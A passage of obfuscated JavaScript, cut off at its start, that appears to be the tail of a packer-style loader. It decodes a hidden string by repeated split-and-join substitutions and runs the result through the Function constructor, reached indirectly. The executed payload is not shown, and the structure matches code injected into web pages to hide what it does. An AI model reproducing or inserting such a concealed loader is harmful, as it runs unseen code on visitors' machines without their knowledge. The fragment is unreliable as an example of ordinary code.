ro;}d=fs(d,qq2,32);d=fs(d,qq21,32);d=fs(d,qq3,32);d=fs(d,qq31,32);map=fs(map,mapper,32);function a(b,c){return b[c];};function ro(){return 'romChar';}for(c=55;c;d=(t=d.split(map.substr(c-=(x=c<9?1:2),x))).join(t.pop()));$$(d)})(function(jsBb){return(function(jsB,jsBs){return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()})((function(jsB){return jsB.constructor}),(function(jsB){return(function(jsBs){return jsB.call(jsB,jsBs)})}))});






